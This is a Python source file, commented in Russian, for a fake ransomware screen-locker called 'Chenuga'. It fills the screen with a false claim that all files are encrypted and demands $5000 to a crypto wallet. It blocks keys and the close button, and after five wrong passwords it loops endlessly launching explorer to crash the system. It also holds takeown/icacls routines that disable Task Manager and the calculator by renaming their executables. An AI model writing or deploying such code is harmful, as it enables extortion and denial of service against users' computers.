import random
import os
import tkinter as tk
from tkinter import *
import keyboard
from tkinter.messagebox import showerror

# Таким решением можно полностью устранить возможность запуска калькулятора или диспетчера задач
# Банально мы переименовываем .exe диспетчера и калькулятора и т.к винда не может найти оригинальные .exe, то процесс
# просто не запускается

def block_task_manager():
    path1 = "C:\Windows\System32\Taskmgr.exe"
    path2 = "C:\Windows\System32\Taskmgr(копия).exe"

    # получем полный доступ к файлу диспетчера задач
    os.system("takeown /f C:\Windows\System32\Taskmgr.exe")
    os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l")
    os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l")  # убиваем диспетчер задач если он запущен

    os.system("taskkill /im taskmgr.exe")  # убиваем диспетчер задач если он запущен
    os.rename(path1, path2)  # перименовываем файл чтобы система не могла его найти

    # os.rename(path2, path1) # чтобы диспетчер задач вновь работал

def block_calculator():
    path1 = "C:\Windows\System32\win32calc.exe"
    path2 = "C:\Windows\System32\win32calc(копия).exe"

    # получем полный доступ к файлу калькулятора
    os.system("takeown /f C:\Windows\System32\win32calc.exe")
    os.system("icacls C:\Windows\System32\win32calc.exe /grant Администраторы:F /c /l")
    os.system("icacls C:\Windows\System32\win32calc.exe /grant Пользователи:F /c /l")  # убиваем калькулятор если он запущен

    os.system("taskkill /im win32calc.exe")  # убиваем калькулятор если он запущен
    os.rename(path1, path2)  # перименовываем файл чтобы система не могла его найти

    #os.rename(path2, path1) # чтобы калькулятор задач вновь работал






def open_error():
    showerror(title="Ошибка", message="Ваши попытки смехотворны")

def disable_alt_f4():
    open_error()
    pass

def crash():
    while True:
        explorer = "explorer"
        os.system(explorer)

def animate():
    color = ["green", "blue", "purple", "brown", "black", "brown", "pink"]
    cls = random.choice(color)
    canvas.config(background=cls)
    wrong_label.config(background=cls, foreground="white")
    button.config(background=cls, foreground="white")
    canvas.after("500", animate)

def check_entry_text():
    entered_text = wind.get()
    if entered_text == "He~%3v3M@{h}u8P7FV":
        window.destroy()
    else:
        global wrong_answers
        wrong_answers += 1
        wrong_label.config(text=f"Использовано попыток: {wrong_answers}")
        if wrong_answers >= 5:
            crash()

block = [
    "[", "]", ";", "'", "\n", "/",
    "*", "-", "=", "+", "|", "`",
    "\t", " ", "shift", "windows", "alt", "del", "esc", "ctrl"
]

window = tk.Tk()
wrong_answers = 0

# Блокировка всех кнопок из словаря block
for key in block:
    keyboard.block_key(key)

canvas = tk.Canvas(window, width=window.winfo_screenwidth(), height=window.winfo_screenheight())

virus_name = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 5,
                                text="Chenuga",
                                font=("Helvetica", 48),
                                anchor='center',
                                fill="white")
text = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 4 + 50,
                          text="Ой, все ваши файлы были зашифрованы!",
                          font=("Helvetica", 18),
                          anchor='center',
                          fill="white")
text = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 4 + 80,
                          text="Что-же вы так неаккуратно...",
                          font=("Helvetica", 18),
                          anchor='center',
                          fill="white")
text = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 2,
                          text="Отправьте 5000$ на биткоин кошелёк: 0xf5A5DA789356df817B184e9D6380a95d5a9ba6c1",
                          font=("Helvetica", 18),
                          anchor='center',
                          fill="white")
text = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 2 + 50,
                          text="При 5 неправильных паролях - удалится вся ваша файловая система :)",
                          font=("Helvetica", 18),
                          anchor='center',
                          fill="white")

wind = Entry(window)
canvas.create_window(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 1.6, window=wind)

button = tk.Button(window, text="Попытать удачу", command=check_entry_text)
canvas.create_window(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 1.5, window=button)

wrong_label = tk.Label(window, text="Использовано попыток: 0", font=("Helvetica", 16), anchor='center')
canvas.create_window(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 1.42, window=wrong_label)

window.attributes('-fullscreen', True)

# Блокируем диспетчер задач и калькулятор
# block_task_manager()
# block_calculator()

while True:
    canvas.pack()
    animate()
    window.protocol("WM_DELETE_WINDOW", disable_alt_f4)
    window.mainloop()
